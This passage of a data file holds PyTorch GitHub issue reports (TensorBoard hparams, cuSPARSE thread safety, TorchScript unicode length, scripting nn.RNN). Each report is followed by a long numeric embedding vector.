Steps to reproduce the behavior:

```
from torch.utils.tensorboard import SummaryWriter

with SummaryWriter() as w:
    for i in range(20):
        w.add_hparams(hparam_dict={'lr': 0.1 * i, 'batch_siz': 10 * i},
                      metric_dict={'hparam/accuracy': 0.9 ** i, 'hparam/loss': 0.01 * i})
    
writer.close()
```",True,"[-3.09862792e-01 -5.63801706e-01 -1.34728581e-01  3.08358539e-02
 -1.00235596e-01 -6.55982435e-01 -1.19689792e-01 -1.62141219e-01
 -7.52715170e-02 -2.67386496e-01  1.40659794e-01  3.39547753e-01
 -4.72403951e-02 -3.78239565e-02 -4.95859325e-01  2.21444264e-01
 -2.28237316e-01  1.13315754e-01 -8.50068703e-02  1.47116184e-01
  1.27891786e-02 -3.03065181e-01 -1.77871853e-01  1.83835328e-01
  3.09657902e-01 -7.31094107e-02 -4.16283756e-02 -9.95388180e-02
  6.95173740e-02 -1.58197600e-02  4.79916245e-01  1.23351023e-01
 -3.26869190e-02  1.04230344e-01 -3.56751643e-02  2.61614889e-01
 -4.47742015e-01 -1.03302471e-01  2.17790101e-02 -1.27744913e-01
  3.28177586e-02 -7.35506862e-02  1.81666836e-02 -7.07275569e-02
  7.92168975e-02  4.79454882e-02 -3.95575874e-02 -4.64501046e-02
  1.30887359e-01 -4.93795145e-03 -2.98267454e-02 -5.13273999e-02
 -4.26667839e-01 -4.15947795e-01  1.02872960e-03 -7.68594220e-02
  2.55801022e-01 -9.03258398e-02  1.68003529e-01 -8.57412890e-02
  2.53931135e-01 -3.47462557e-02  1.01894997e-01  5.11337370e-02
  1.40217632e-01  7.79721588e-02  1.87579542e-01 -1.94594324e-01
  2.10619923e-02  6.94751740e-02  2.95666516e-01  1.81709141e-01
 -2.02926010e-01 -1.81025892e-01  2.07207456e-01 -3.08975913e-02
 -2.69045293e-01  1.99132442e-01 -6.38391972e-02 -5.21539338e-03
 -8.80078319e-03 -9.59569886e-02  2.06158072e-01  1.60142109e-02
  2.18161821e-01  2.02680547e-02  2.29573157e-02 -1.61755353e-01
  2.69503713e-01 -3.95774961e-01  4.90974605e-01 -6.04674704e-02
 -2.77729034e-01 -1.49679556e-03  1.49693236e-01  1.21439911e-01
  2.67622530e-01  3.06223799e-02 -9.07544792e-02  1.92836151e-02
 -2.73955643e-01 -2.15562165e-01  1.36179812e-02  2.91957855e-01
 -8.32023919e-02  8.31348225e-02  2.81608906e-02 -1.30026489e-01
 -3.81121665e-01  6.19300082e-02  1.20023534e-01 -2.82320023e-01
 -1.83246117e-02  3.71848136e-01  3.51987779e-02  9.56968963e-02
 -1.02937579e-01 -6.39940053e-02 -3.95819187e-01  2.16515124e-01
 -5.95182657e-01  1.28886893e-01  4.53749709e-02  2.17347428e-01
  1.08819842e-01  9.46723670e-02 -3.24018389e-01  1.12095550e-01
 -2.93128230e-02 -4.54581678e-02  7.20396638e-02  2.81349495e-02
  1.66952640e-01  4.07309756e-02 -1.05553478e-01 -3.87533917e-03
  1.65574737e-02 -2.62258232e-01 -2.83691853e-01 -1.06047519e-01
  1.08617283e-01  2.14247167e-01 -2.32340861e-02 -2.34889805e-01
  3.51742893e-01  2.35086083e-01 -3.39088678e-01  2.13490993e-01
  7.56028742e-02  2.18724549e-01  4.05240394e-02  2.49240637e-01
 -1.28532529e-01  7.35121489e-01  3.96224484e-02  3.42222869e-01
 -3.24338935e-02 -8.42991471e-02 -1.86561480e-01 -3.43809664e-01
  3.33251834e-01  1.52723551e-01 -2.34306246e-01 -1.28780439e-01
  2.72522509e-01  1.50247335e-01 -3.81574512e-01 -4.81726170e-01
  6.77944124e-02  1.62277356e-01 -1.51732609e-01  8.58069509e-02
 -1.99115396e-01  5.18987954e-01  5.28019071e-01  3.93445343e-02
  1.08373858e-01 -6.10467613e-01 -2.32815370e-01  2.08413541e-01
  2.10100740e-01  4.93384004e-02  1.58404589e-01 -7.68095478e-02
  5.46398237e-02  4.32197116e-02  4.57907856e-01 -4.30192739e-01
  1.09225065e-01  1.07734818e-02 -1.31124079e-01  3.57830375e-02
  3.43374312e-01  1.70416266e-01  1.28546089e-01  2.89729476e-01
  3.44052702e-01 -4.16682884e-02 -1.68446060e-02  1.03812572e-03
 -3.92754436e-01 -6.74794465e-02  3.18836093e-01  1.51623309e-01
 -6.72991574e-02 -5.57585359e-01 -1.41078755e-02 -2.16851890e-01
 -4.13136035e-01  1.84986413e-01  1.45796582e-01 -6.21393979e-01
 -6.96577281e-02  1.58683226e-01 -1.94962412e-01  2.15303212e-01
 -1.06756099e-01  1.33165538e-01 -2.29722738e-01  2.86341578e-01
 -7.37382621e-02 -5.13900593e-02 -2.21086726e-01 -2.87538469e-01
 -1.33702099e-01 -1.34337712e-02 -2.69305706e-01 -3.06127876e-01
 -2.13840604e-02  2.30671167e-01  7.18372688e-03 -1.62880912e-01
  1.48314789e-01 -2.86908299e-01 -8.13177228e-02 -1.27111841e-02
 -5.28970838e-01 -1.43699840e-01  1.52620867e-01  6.45677000e-02
 -3.12670559e-01 -2.60646585e-02 -1.36642665e-01 -1.50954530e-01
  3.59373868e-01  8.67029279e-02  3.00349414e-01  6.66088909e-02
 -6.11400791e-02  2.90428698e-01  1.28076911e-01 -2.85494387e-01
  2.05433160e-01  1.55821219e-01  1.06412902e-01 -1.13403283e-01
  3.47110480e-01  2.04912126e-01  1.77870631e-01  6.40509650e-04
  4.58398044e-01  2.42224634e-01 -1.36221468e-01  3.60222608e-01
  2.47433279e-02  4.29902792e-01  7.08128288e-02  3.02623957e-01
 -1.74445361e-02 -3.90473753e-01 -3.29998992e-02 -1.25641063e-01
  1.63095966e-01 -4.29145068e-01 -9.63327438e-02 -3.34459126e-01
  4.22601819e-01  1.57151133e-01 -2.46024728e-01  3.07052266e-02
 -1.61921158e-01  1.58837214e-01  2.71849215e-01  1.52962551e-01
 -7.21550062e-02 -3.03924203e-01 -3.43731374e-01 -3.15804064e-01
 -1.01617076e-01  9.75322649e-02 -1.82105869e-01 -5.73799014e-02
  2.44033635e-01  1.63509056e-01 -1.55822307e-01  2.01739967e-02
  1.54203758e-01  7.42944553e-02 -1.86455056e-01 -4.75641601e-02
 -1.10288456e-01  3.71225417e-01  3.19158435e-01 -4.40133929e-01
 -1.37898833e-01 -1.63921967e-01  1.60440177e-01  2.05546752e-01
  3.36051136e-01 -3.73008668e-01  3.12279969e-01  1.09807707e-01
 -1.25518784e-01  4.09720242e-01 -1.47195309e-01  2.93158948e-01
  2.01044858e-01  6.70290828e-01 -2.57467255e-02  1.69973336e-02
 -1.38567090e-01 -7.44587928e-02 -2.96005845e-01 -4.13220003e-02
  2.02726442e-02 -3.43224108e-01 -1.33743122e-01  1.48634434e-01
 -9.26579237e-02 -4.17885929e-01 -7.49700814e-02 -3.28412652e-01
  2.21360531e-02  3.84837955e-01 -2.83952467e-02 -3.28983702e-02
 -2.12689891e-01  1.24695219e-01 -2.83492301e-02 -2.97216237e-01
 -3.57433744e-02 -2.29644105e-01  2.63588071e-01 -4.34940040e-01
 -2.38237470e-01 -3.81128043e-01  1.73526287e-01  6.40339851e-01
  4.78664739e-03 -2.51262896e-02  9.89047214e-02  6.29368722e-02
 -6.37741238e-02  3.07216525e-01  1.96880966e-01  3.08306158e-01
 -1.19172975e-01 -8.20490532e-03  1.21261552e-02  6.12513423e-01
 -4.04686809e-01 -2.40013093e-01 -2.96500742e-01  9.81052220e-02
  5.40137231e-01  1.45188849e-02  1.13414764e-01 -1.44919246e-01
  1.69503331e-01  4.85363901e-01 -1.92984104e-01  5.08399844e-01
 -5.83752207e-02 -1.18999049e-01  2.63695657e-01 -2.71912843e-01
 -5.76994270e-02  5.09005070e-01  1.06129631e-01 -1.68290764e-01
  1.98302925e-01 -6.13170639e-02 -3.55805695e-01 -3.31925228e-04]"
cuSPARSE handle is not thread-safe module: cuda triaged,"From what I observe when working on https://github.com/pytorch/pytorch/pull/29233, cusparse handle is managed the same way as cublas handle, therefore not thread-safe.

https://github.com/pytorch/pytorch/pull/29233 makes the handle pool mechanism which was originally used for cudnn generic, so it would also be able to use to manage cusparse handle. We should migrate the management of cusparse handle to that approach.

See also: https://github.com/pytorch/pytorch/issues/6962

cc: @mcarilli @ngimel @mruberry ",True,"[-6.92839384e-01 -2.88855433e-01 -5.49845099e-01  1.34613410e-01
 -9.94353592e-02 -4.91436958e-01  6.11122400e-02 -1.47711020e-02
 -3.86547819e-02 -1.03872016e-01 -1.65255696e-01  1.32952198e-01
 -2.52035260e-01 -4.73140478e-02 -2.23192811e-01 -1.39054269e-01
  3.19569170e-01  1.60436630e-01 -1.04623139e-01 -4.29918170e-02
 -3.74004304e-01  7.43602291e-02 -1.16767645e-01 -1.38436615e-01
  7.88234994e-02 -1.19624123e-01 -1.40011504e-01 -3.00783038e-01
  7.45734498e-02 -3.66861284e-01  1.93496302e-01 -1.25605658e-01
 -1.16823003e-01  1.45489126e-01 -1.28236100e-01  4.76588085e-02
 -3.99887800e-01 -2.08281487e-01 -9.17875171e-02 -2.43964434e-01
 -1.72841817e-01  5.93929514e-02 -5.14234528e-02 -8.94175563e-03
 -1.37060046e-01 -9.52832587e-03  1.58134982e-01  2.19729930e-01
 -3.99493933e-01 -2.40268946e-01 -7.66538270e-03  4.52976152e-02
  8.42470229e-02 -6.02553040e-02 -4.55249995e-02  1.97556764e-01
  1.13523990e-01 -6.46034777e-02 -2.02542216e-01 -5.02246665e-04
  4.58553344e-01 -7.41049498e-02  1.40707977e-02 -1.80861354e-03
  2.33592018e-01  6.07848354e-02  1.71040390e-02 -4.87124622e-02
  2.97714263e-01  4.84070331e-02  2.81790197e-01  1.14436202e-01
 -4.66364443e-01 -1.71866536e-01  3.09421748e-01  4.09671813e-01
  3.04240882e-01 -2.83330921e-02  2.84335077e-01 -1.69187598e-02
 -4.09817919e-02  2.09652290e-01  2.45179862e-01 -8.23157579e-02
  1.58612967e-01 -2.98729688e-02  9.58242118e-02  6.06806539e-02
 -6.81874901e-02 -2.00234726e-01  2.17436314e-01  4.30856854e-01
 -6.80664042e-03  1.38338298e-01  8.19607228e-02  3.89993608e-01
 -5.53717092e-03  2.29151160e-01 -2.75073886e-01 -3.46908271e-01
 -3.88356186e-02 -6.92574531e-02 -8.63261148e-02  3.89664263e-01
 -7.19804615e-02 -3.26823771e-01  3.43009561e-01  3.80799890e-01
 -1.30320862e-01  5.73429316e-02  2.34780118e-01  7.66249225e-02
  2.26211146e-01  1.05524331e-01 -1.38316959e-01 -3.62960398e-02
 -3.33605766e-01 -2.34506294e-01  2.39142299e-01 -4.74800579e-02
 -2.72671878e-01  1.04971305e-01 -2.04991728e-01 -2.07279474e-01
  3.34203660e-01  3.22689414e-01 -1.44498795e-03  9.50740278e-03
 -2.12942928e-01  1.30072758e-01 -1.00865468e-01 -3.39322001e-01
  1.29522666e-01 -6.15105480e-02 -1.66239828e-01  3.67637314e-02
 -3.41121346e-01  4.50823046e-02 -1.91387668e-01 -1.28308609e-01
 -1.02690786e-01  2.65020102e-01  1.59113333e-02 -1.78214967e-01
  1.89591959e-01  1.18271314e-01 -5.73494546e-02 -2.15428963e-01
  6.36050254e-02  2.43123427e-01 -4.16581690e-01  7.10975379e-02
 -2.69024670e-01  3.19810510e-01  1.31038073e-02  3.22925568e-01
 -5.62904142e-02  2.12179143e-02  1.80652052e-01 -2.37779230e-01
  9.60464776e-02  2.52976328e-01  2.52226889e-01  2.26987824e-01
 -1.89729437e-01  3.78930159e-02 -1.47407204e-01 -9.50423852e-02
  3.20774950e-02  2.65003920e-01 -3.93293411e-01 -2.79706806e-01
  2.49959648e-01 -3.83454859e-01 -1.53914299e-02 -1.76054001e-01
 -4.47902024e-01  1.06350824e-01  2.26366639e-01  2.41886809e-01
  1.63077563e-01  4.14958626e-01  3.61892402e-01 -1.54291913e-01
  1.53838426e-01  2.90947676e-01  2.60697067e-01  2.85179138e-01
 -4.64676678e-01  1.75636820e-03 -3.20380330e-01 -2.02520676e-02
  4.39832956e-02  1.15576789e-01 -7.89626688e-02  8.35534632e-02
 -1.66145638e-01  1.06896549e-01 -9.53414589e-02  1.95846021e-01
 -1.51432514e-01  1.10687256e-01 -1.97695673e-01 -7.37076402e-02
 -2.23480195e-01  1.25021651e-01  4.69597243e-02 -3.12591344e-01
 -1.59818865e-02  9.00640637e-02 -1.45914629e-01 -6.05302304e-02
 -4.63272154e-01 -1.77290142e-01  2.17768997e-02 -1.36240616e-01
  1.04677774e-01  3.01246375e-01 -4.05155588e-03  2.03788146e-01
  2.35109314e-01 -1.08488396e-01  4.40905571e-01 -1.32959619e-01
  8.90141167e-03  1.71181306e-01  1.28268912e-01  2.12048441e-02
 -2.82012820e-01  1.09616429e-01 -2.67251015e-01 -4.04576480e-01
 -8.54583085e-03  1.37610704e-01 -6.76427335e-02  9.45693254e-02
  1.93817675e-01 -1.95739731e-01  3.66570801e-02  2.06808913e-02
 -1.02392212e-01 -3.75976980e-01 -2.27763444e-01  9.14360881e-02
  1.85027361e-01  2.46242478e-01  8.06041509e-02  1.77112475e-01
 -2.71740317e-01 -1.06927536e-01  4.79719862e-02 -2.73963958e-01
  1.13520525e-01 -1.32873371e-01 -1.47513360e-01 -8.83086212e-03
  7.08132535e-02  9.89814028e-02 -3.73955846e-01 -1.85237870e-01
  1.09646745e-01  4.10805285e-01 -1.17308736e-01  1.32860839e-01
  5.64364791e-01  6.17019124e-02 -3.27174038e-01  2.35881001e-01
  2.97882147e-02  8.82476270e-02  5.80758788e-03 -2.39968866e-01
  3.41666155e-02 -2.41649136e-01  1.98010266e-01 -1.00777568e-02
  6.69100285e-01 -1.17998801e-01  2.95053005e-01  1.86802834e-01
  7.00950921e-01 -2.97439039e-01  1.93316430e-01  2.23909020e-01
  3.03147554e-01 -3.67976815e-01 -2.12079763e-01 -3.18325125e-03
  1.52764857e-01 -2.35943481e-01 -4.39312130e-01  8.66509229e-02
  2.28721164e-02 -3.46098840e-01 -3.34789045e-04  1.14811346e-01
  4.35236424e-01  2.38692351e-02 -2.26747692e-02 -1.65743619e-01
 -1.94650888e-01 -1.87037602e-01 -1.86283141e-01 -1.76665217e-01
 -2.21402645e-01 -7.46916980e-02  1.07435271e-01 -1.57331582e-02
  2.11088777e-01 -2.07504593e-02 -5.67425936e-02 -1.39628708e-01
 -2.48750210e-01  1.43575817e-01 -2.73647130e-01 -1.12357177e-01
  9.27657261e-03  2.01360047e-01  1.32573038e-01  2.05596149e-01
 -7.93498456e-02 -4.41060662e-01 -4.39269133e-02 -2.00017124e-01
  8.08597449e-03  4.70899910e-01 -1.46660089e-01  1.93842977e-01
  1.16569832e-01  5.73653579e-01  2.69876607e-02  5.41909970e-02
  9.03853923e-02  1.42010003e-01 -5.98785654e-02  4.37462211e-01
  2.87537396e-01 -3.54552329e-01 -1.45300776e-01 -1.27619896e-02
 -4.86127973e-01  1.49351329e-01 -5.10654077e-02  9.63241383e-02
 -1.85331225e-01 -6.19308427e-02  2.07658321e-01  5.93901873e-01
  1.31190211e-01 -1.08500376e-01 -3.26196074e-01  2.97671139e-01
  7.08925650e-02  5.67632094e-02 -3.04317269e-02  2.31598109e-01
 -1.70291886e-01  4.07921523e-02 -2.82171853e-02 -9.39371511e-02
  9.80560258e-02  3.77014965e-01 -2.50499129e-01  1.84777468e-01
  4.17727157e-02 -1.33934438e-01 -1.26314968e-01 -2.77534164e-02
  4.77028266e-02  2.17274427e-01 -4.42993402e-01  9.18376297e-02
  2.17018634e-01  2.98119158e-01  2.15635329e-01  4.89851870e-02
  1.69231564e-01 -4.28896099e-01 -7.07294047e-03  3.99594605e-01
  1.19326793e-01 -3.73637557e-01  1.57649428e-01 -8.96427929e-02]"
TorchScript does not preserve string behavior for string with unicode characters oncall: jit triaged jit-backlog,"## ðŸ› Bug

If a function calls `len(s)`, it works differently in scripted and eager modes.

## To Reproduce

Test:
```
import torch
string = ""NormanÃ°y""
print(string)

def foo(s: str):
    return len(s)

foo_scripted = torch.jit.script(foo)

print(foo(string))
print(foo_scripted(string))
```

Output:
```
NormanÃ°y
8
9
```

cc @suo",True,"[-4.41150725e-01  8.99908878e-03 -1.09187663e-01 -9.98178571e-02
 -1.49499476e-01 -1.62790835e-01  6.84621409e-02  2.27577448e-01
 -6.84718341e-02 -2.30469003e-01 -7.83893615e-02  1.06003713e-02
 -7.19279051e-02  7.26898760e-02  2.47612894e-01 -4.79638800e-02
 -1.66606843e-01 -1.41626328e-01 -1.99650168e-01 -2.43223771e-01
  1.67444259e-01 -1.83871120e-01 -7.31699616e-02 -1.23110041e-01
 -2.12002099e-01  2.54890919e-01 -5.86660728e-02  2.00887203e-01
  2.43966118e-01  1.21424206e-01 -1.20304279e-01  2.53062584e-02
 -4.83383328e-01  9.91897136e-02  4.26257811e-02  2.94399112e-01
 -1.55073777e-01  7.86760747e-02 -1.58859521e-01 -2.37901524e-01
 -5.53312302e-02 -3.07048112e-02  1.24145530e-01 -1.35880455e-01
  6.15310343e-03  6.95819110e-02 -1.45737156e-01  7.91326836e-02
 -2.91034222e-01  2.18165591e-01 -1.70257501e-02  2.27127373e-01
 -9.14891884e-02  1.30451605e-01  3.12184095e-01 -9.38726813e-02
 -8.07054937e-02  5.08280173e-02 -2.47599594e-02 -2.52800405e-01
  1.70286596e-01  1.06870048e-02 -2.74970055e-01 -1.63787112e-01
 -6.71949387e-02 -2.38690451e-01  4.06247452e-02  2.61816204e-01
  3.54638100e-01 -1.46994174e-01  2.99183484e-02  9.06527042e-02
  2.42968440e-01  1.77550033e-01  3.59909981e-02  4.75758165e-02
 -3.50768328e-01 -5.77389598e-02 -1.67339712e-01 -2.54823923e-01
  2.35536918e-01 -2.70361483e-01 -6.05120435e-02 -8.36279765e-02
  2.14543611e-01  1.89647734e-01  1.91011637e-01 -2.44927213e-01
  4.79565591e-01  5.50618649e-01 -2.81153202e-01 -6.84940144e-02
  4.50080447e-02  2.40282178e-01 -4.24868822e-01  1.87375009e-01
  3.48596692e-01  5.60055859e-03 -3.34542274e-01 -2.22192109e-01
  2.30748896e-02 -2.51455188e-01 -2.21791923e-01  8.18011388e-02
  2.71721572e-01 -1.43173575e-01 -2.67017093e-02  3.14181656e-01
  1.96514755e-01 -3.41401577e-01  1.08769007e-01  4.95035835e-02
  2.88377497e-02 -3.27054188e-02  2.17620097e-03 -5.28333262e-02
  1.29533127e-01 -2.96485692e-01 -2.55037189e-01  3.35191280e-01
  2.38217503e-01  4.78446931e-01 -2.51725376e-01  1.43166319e-01
  2.99166858e-01 -4.04527858e-02  1.54458776e-01 -5.37883677e-03
  3.24001372e-01  3.01107436e-01 -7.41354898e-02 -2.65302770e-02
  5.70966378e-02 -9.84924566e-03  3.91354501e-01  1.30076826e-01
 -4.23959583e-01  1.18742280e-01 -1.33789638e-02 -1.84428930e-01
 -1.28825516e-01 -2.85641491e-01 -8.98717195e-02 -2.14510053e-01
  2.69436687e-01 -3.65488440e-01 -2.46031463e-01  2.68761098e-01
  1.12000249e-01 -2.67562687e-01 -1.50122359e-01 -6.40652031e-02
 -6.19583368e-01  9.21161994e-02 -9.34494659e-02 -2.52437815e-02
  2.82022536e-01  4.99119088e-02  3.00862730e-01 -1.60955995e-01
  2.77582347e-01  8.24786574e-02  3.99654686e-01 -1.34271681e-01
  2.32140660e-01 -5.01509234e-02 -1.25313386e-01  4.09539461e-01
 -5.17682910e-01  1.66231506e-02 -1.23953879e-01 -1.06036872e-01
 -2.07229793e-01 -1.83767304e-01  5.91634922e-02 -3.49584781e-02
 -2.16134503e-01 -2.59735554e-01 -8.09446648e-02  5.03623903e-01
  5.15722990e-01  4.80841756e-01  3.14185262e-01  8.16996247e-02
 -1.73510432e-01 -1.61197454e-01  4.63647023e-02  2.79568732e-01
 -1.36685953e-01 -7.86635727e-02 -5.62269054e-02 -2.60416031e-01
 -1.08778477e-01 -1.37090445e-01  4.82821688e-02 -4.03251462e-02
 -3.33011746e-01 -2.79935479e-01 -2.22259462e-01 -1.17729105e-01
 -2.21679494e-01  1.16362721e-01 -2.22471729e-03 -2.37006590e-01
  2.53023952e-01  3.90945256e-01 -1.92967206e-01 -5.62614322e-01
  1.33061185e-02  1.24097541e-01 -1.41883582e-01  1.34736001e-01
  1.44017041e-02 -1.39819980e-01  2.56629407e-01 -2.20742375e-01
  5.09012304e-02 -1.37677699e-01  9.17167440e-02  3.19497660e-02
  3.99551153e-01 -4.25080895e-01  2.17335969e-01 -2.88197044e-02
  1.12072289e-01  4.97047037e-01 -4.37942863e-01 -6.36034552e-03
 -3.82859670e-02 -1.41353011e-01  1.34871930e-01 -1.89491600e-01
  1.83170453e-01 -2.46463224e-01  3.06995120e-02  2.79682249e-01
 -1.63212761e-01 -1.23724438e-01 -1.48875445e-01 -9.64515805e-02
 -8.82834792e-02  1.56448394e-01  2.27401927e-01 -2.25325584e-01
 -1.13689512e-01 -3.97370979e-02 -2.64065087e-01  1.93248894e-02
 -9.41994265e-02 -2.22218081e-01 -2.04003155e-01  5.40588871e-02
 -3.94753158e-01  6.43810630e-02  5.23935318e-01 -2.34557111e-02
  2.15664320e-03  3.92883644e-02 -2.04314560e-01 -9.31984633e-02
  1.55479908e-01  4.40431178e-01  7.17895702e-02 -4.76848707e-02
 -6.81962669e-02 -3.58453393e-01  4.21482325e-02  1.79441571e-01
 -1.94130778e-01  2.33070955e-01 -1.45805329e-01 -1.74249351e-01
  2.57985383e-01  2.81738728e-01  4.24050063e-01 -3.51961732e-01
  9.01409052e-03 -6.36495352e-02 -2.14632183e-01 -4.19270933e-01
  7.25502074e-02  1.44123277e-02 -3.66045237e-01  2.96568632e-01
  2.03128815e-01 -2.11971760e-01  1.45730540e-01  5.88870123e-02
 -1.01844579e-01 -3.80181044e-01  3.21013248e-03 -6.44382089e-05
  3.43701243e-01 -3.46334070e-01 -5.77561669e-02 -9.12137330e-02
 -2.45320145e-03  2.28327826e-01  2.35639885e-01  1.31371766e-01
 -1.34063095e-01  2.30366707e-01  2.51249731e-01  5.16359568e-01
  1.47072002e-02  6.50342554e-02 -1.09468378e-01 -1.43651038e-01
  2.69391477e-01 -1.82128564e-01  1.19472124e-01  3.49092424e-01
 -3.54375094e-01 -1.35619342e-01  1.01284996e-01  4.85023558e-01
 -1.06997535e-01  1.71336383e-01  4.02540863e-01  3.85079801e-01
 -2.13622093e-01 -4.52451080e-01 -5.36434591e-01 -2.73072898e-01
 -3.95283014e-01  7.53070712e-02  1.06942520e-01 -1.23920269e-01
  6.80666789e-02 -2.14149714e-01 -1.27136007e-01  2.33529374e-01
 -2.07250174e-02  5.76111525e-02 -2.26699442e-01 -3.94649327e-01
  2.94713795e-01  3.31279397e-01 -1.15876064e-01 -4.64714952e-02
 -2.84123242e-01 -1.12002492e-01  9.44285691e-02 -1.07234947e-01
 -2.55336046e-01 -3.31911147e-02 -3.38952690e-02 -6.05662428e-02
 -3.02972555e-01  1.20584011e-01  1.15377409e-02  4.96627018e-03
  5.11657894e-02  3.87690723e-01 -6.43311813e-03  3.50279033e-01
 -5.22944145e-02  2.21838862e-01 -8.41680616e-02  3.09792399e-01
  2.61449099e-01  5.47147244e-02 -4.46156204e-01 -9.26764682e-02
  1.16664112e-01  1.43979073e-01  2.06045747e-01 -1.53253943e-01
  2.98818827e-01  6.94335438e-03 -1.31097078e-01  1.89229965e-01
  5.71206287e-02  2.16728091e-01  3.41421574e-01 -1.81660861e-01
  7.39230216e-02 -2.31937803e-02  2.39948019e-01  4.28663641e-02
 -5.61688244e-02  2.63696223e-01  3.29595983e-01 -9.50579941e-02]"
[jit][script] torch.jit.script does not support nn.RNN oncall: jit triaged,"## ðŸ› Bug

`torch.jit.script` does not seem to support `nn.RNN`

## To Reproduce

Running

```python
import torch
import torch.nn as nn

torch.jit.script(nn.RNN(32, 64, 1))
```

fails with

```
Traceback (most recent call last):
  File ""test.py"", line 4, in <module>
    torch.jit.script(nn.RNN(32, 64, 1))
  File ""/opt/anaconda/envs/test/lib/python3.6/site-packages/torch/jit/__init__.py"", line 1203, in script
    return torch.jit.torch.jit._recursive.recursive_script(obj)
  File ""/opt/anaconda/envs/test/lib/python3.6/site-packages/torch/jit/_recursive.py"", line 173, in recursive_script
    return copy_to_script_module(mod, overload_stubs + stubs)
  File ""/opt/anaconda/envs/test/lib/python3.6/site-packages/torch/jit/_recursive.py"", line 95, in copy_to_script_module
    torch.jit._create_methods_from_stubs(script_module, stubs)
  File ""/opt/anaconda/envs/test/lib/python3.6/site-packages/torch/jit/__init__.py"", line 1423, in _create_methods_from_stubs
    self._c._create_methods(self, defs, rcbs, defaults)
RuntimeError: 
Tensor cannot be used as a tuple:
at /opt/anaconda/envs/test/lib/python3.6/site-packages/torch/nn/modules/rnn.py:184:67
    def forward(self, input, hx=None):
        is_packed = isinstance(input, PackedSequence)
        if is_packed:
            input, batch_sizes, sorted_indices, unsorted_indices = input
                                                                   ~~~~~ <--- HERE
            max_batch_size = batch_sizes[0]
            max_batch_size = int(max_batch_size)
        else:
            batch_sizes = None
            max_batch_size = input.size(0) if self.batch_first else input.size(1)
            sorted_indices = None
            unsorted_indices = None

        if hx is None:
```

## Expected behavior

That you can successfully jit `nn.RNN` like you can with `nn.LSTM` and `nn.GRU`.

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```PyTorch version: 1.3.0
Is debug build: No
CUDA used to build PyTorch: None

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 8.3.0-6ubuntu1~18.04.1) 8.3.0
CMake version: Could not collect

Python version: 3.6
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] numpy==1.17.2
[pip] torch==1.3.0
[conda] cpuonly                   1.0                           0    pytorch
[conda] mkl                       2019.4                      243  
[conda] pytorch                   1.3.0               py3.6_cpu_0  [cpuonly]  pytorch
```

cc @suo",True,"[-8.26418757e-01 -4.46928293e-02  1.39768701e-03  9.27495360e-02
  2.02040896e-01 -1.07180774e-01 -1.36746377e-01  4.03034478e-01
 -3.13005239e-01 -1.82411373e-01 -2.87403643e-01  1.60587132e-01
 -3.16884071e-01  1.78269535e-01  4.28031944e-02  1.63909346e-02
 -3.48797441e-01 -2.97795445e-01  1.97690539e-02 -2.96929777e-01
  6.94241375e-02  5.70602268e-02  1.07100531e-01 -1.89675659e-01
 -9.78574902e-02 -6.37122095e-02 -1.29744738e-01  7.71768764e-02
  5.22118568e-01  8.75838771e-02  4.45486791e-03 -3.63191292e-02
 -9.96273756e-01  1.64231047e-01  6.04142249e-03  9.52956602e-02
 -4.92770374e-01  6.80079609e-02 -2.03033090e-01 -1.40234619e-01
  2.62484223e-01  3.40159476e-01 -3.33673581e-02 -1.47426620e-01
  2.14733452e-01  7.30442107e-02 -3.14296558e-02 -6.36097230e-03
 -2.62523144e-01 -1.68153942e-01 -1.62626788e-01  1.16654426e-01
 -1.36300266e-01  1.59424126e-01  3.51958722e-01 -1.96485385e-01
 -1.89505830e-01  9.83117074e-02  2.29594588e-01 -4.75427449e-01
 -8.30965117e-02  1.95419610e-01 -2.63459116e-01 -1.71684176e-01
  2.12401047e-01 -3.17691386e-01 -6.91305473e-02  2.89716601e-01
  5.86069822e-01 -1.23333335e-01  8.69101100e-03  1.69867883e-03
  1.77048445e-01  3.63223821e-01 -1.60839200e-01  1.40637457e-01
 -2.05957651e-01  1.03505649e-01 -3.47964674e-01 -2.35865682e-01
  1.63047984e-01  4.21583056e-02  4.09482233e-02  1.00459665e-01
  2.52588034e-01  2.99276888e-01  7.60135651e-02 -8.42429549e-02
  2.66233683e-01  3.57161582e-01 -6.76339865e-02  2.66341329e-01
  1.60845071e-01  3.58341455e-01 -2.73379534e-02 -6.37030602e-02
  3.29949409e-01  7.82699585e-02 -5.15054762e-01 -3.10631782e-01
 -8.15938264e-02 -7.69573689e-01 -3.29618752e-01  3.53829741e-01
  2.10017771e-01 -4.05827947e-02  2.11540759e-01  1.62642851e-01
  2.64865100e-01 -3.16415727e-01  2.20075473e-01  2.94149280e-01
 -1.67996049e-01 -4.11843121e-01 -1.78722218e-01 -3.02588820e-01
 -5.20305514e-01 -2.52637208e-01 -2.27286845e-01  6.35132074e-01
  1.52476519e-01  2.69166529e-01 -3.99817675e-02  1.81432053e-01
  4.06461000e-01  1.92157447e-01  1.46979056e-02 -2.06077173e-01
 -7.06856176e-02  1.15458921e-01 -1.23502776e-01  1.07371174e-01
  3.54079157e-02  3.96056697e-02  4.73223805e-01  2.31103659e-01
 -5.31348109e-01  8.37078169e-02 -1.50592983e-01 -2.20235780e-01
 -3.54743540e-01 -2.87220478e-01 -1.21887028e-01 -3.11383635e-01
  1.59631863e-01 -5.08686483e-01 -4.32320274e-02  1.77458882e-01
  8.67954344e-02 -2.03792870e-01 -7.75619373e-02  1.44662172e-01
 -7.29035020e-01  4.14410323e-01 -9.90531296e-02  1.15961790e-01
  1.94301635e-01  4.80569117e-02  2.32878685e-01 -2.46730298e-01
  4.14071172e-01  4.87119071e-02  7.57723488e-03 -1.95087880e-01
  2.76324213e-01 -2.86716223e-01 -1.43155769e-01  1.09629840e-01
 -7.34889090e-01 -2.02654153e-02 -2.98597664e-01 -2.59248942e-01
 -6.66858554e-02 -1.73895150e-01 -1.00368923e-02  1.48875620e-02
 -1.24261335e-01 -2.04651982e-01 -2.45565221e-01  4.10904258e-01
  5.44896364e-01  4.56751496e-01  4.19990540e-01  3.66973802e-02
 -3.03152442e-01  2.17716172e-02  3.05893421e-01  7.26621300e-02
 -1.46722734e-01 -1.19744353e-01 -4.88950312e-01 -7.93923140e-02
  2.82754838e-01  1.14959821e-01  1.59702420e-01  1.65786743e-01
